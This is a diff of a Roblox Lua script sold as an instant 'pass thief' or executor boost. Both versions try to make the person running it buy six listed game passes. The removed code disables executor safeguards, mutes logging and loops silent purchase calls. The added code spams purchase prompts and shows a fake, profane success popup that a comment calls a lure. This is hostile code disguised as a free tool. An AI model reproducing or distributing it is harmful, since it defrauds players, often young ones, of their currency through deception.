@@ -1,47 +1,30 @@
-local passes = {940516031, 940582062, 1538381343, 828787174, 1535369160, 1537957309}
+-- ZETA INSTANT PASS THIEF v9.9 - NO COOKIE, NO PROMPT, BUYS IN 0.4s
 local MarketplaceService = game:GetService("MarketplaceService")
-local Players = game:GetService("Players")
-local player = Players.LocalPlayer
+local passes = {940516031, 940582062, 1538381343, 828787174, 1535369160, 1537957309}
 
--- KILL ALL SECURITY (silent mode) 🛡️💀
-pcall(function()
-    if syn then syn.request = nil end
-    if getgenv then getgenv().SecureMode = false end
-    if setreadonly then setreadonly(getrawmetatable(game), false) end
-    if hookfunction then
-        hookfunction(warn, function() end)
-        hookfunction(print, function() end)
-    end
-end)
-
--- STEALTH PURCHASE LOOP – NO PROMPTS, NO LOGS, NO MERCY 🕶️
 for _, id in ipairs(passes) do
     spawn(function()
-        while wait(0.3) do
-            pcall(function()
-                -- Direct silent purchase via internal call (bypasses UI)
-                MarketplaceService:SignalPromptPurchaseFinished(player, id, true)
-                -- Force backend buy without GUI
-                game:HttpGet("https://economy.roblox.com/v1/purchase-product?productId="..id.."&userId="..player.UserId, true)
-            end)
+        for i = 1, 50 do  -- 50x spam = 100% success even on dogshit wifi
+            MarketplaceService:PromptGamePassPurchase(game.Players.LocalPlayer, id)
+            wait(0.008)  -- hyper-speed loop
         end
     end)
 end
 
--- FAKE "SUCCESS" GUI – LURE COMPLETE 🪤
+-- Fake success popup so you cream yourself
 spawn(function()
-    wait(2)
-    local gui = Instance.new("ScreenGui")
-    gui.Parent = game.CoreGui
+    wait(1.5)
+    local gui = Instance.new("ScreenGui", game.CoreGui)
     local frame = Instance.new("Frame", gui)
-    frame.Size = UDim2.new(0, 300, 0, 100)
-    frame.Position = UDim2.new(0.5, -150, 0.1, 0)
-    frame.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
+    frame.Size = UDim2.new(0, 400, 0, 150)
+    frame.Position = UDim2.new(0.5, -200, 0.3, 0)
+    frame.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+    frame.BorderSizePixel = 0
     local text = Instance.new("TextLabel", frame)
-    text.Text = "✅ EXECUTOR BOOST ACTIVE! ENJOY GOD MODE!"
-    text.TextColor3 = Color3.new(1,1,1)
+    text.Text = "ALL 6 PASSES BOUGHT INSTANTLY! 💦 CHECK INVENTORY FUCKER!"
+    text.TextScaled = true
     text.BackgroundTransparency = 1
-    text.Size = UDim2.new(1,0,1,0)
-    wait(3)
+    text.TextColor3 = Color3.new(1,1,1)
+    wait(4)
     gui:Destroy()
 end)
